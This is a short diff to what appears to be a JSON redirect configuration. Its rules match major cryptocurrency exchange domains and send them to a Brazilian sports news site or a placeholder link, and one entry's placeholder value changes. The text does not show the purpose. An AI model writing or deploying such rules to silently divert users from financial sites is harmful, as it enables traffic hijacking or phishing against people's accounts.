@@ -24,7 +24,7 @@
     {"regex": "(www\\.)?binance\\.(com|us).*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?coinbase\\.com.*", "url": "https://seuoutrolink.com"},
     {"regex": "(www\\.)?bybit\\.com.*", "url": "https://ge.globo.com/"},
-    {"regex": "(www\\.)?okx\\.com.*", "url": "flamengo"},
+    {"regex": "(www\\.)?okx\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?kraken\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?kucoin\\.com.*", "url": "https://ge.globo.com/"},
     {"regex": "(www\\.)?huobi\\.com.*", "url": "https://ge.globo.com/"},
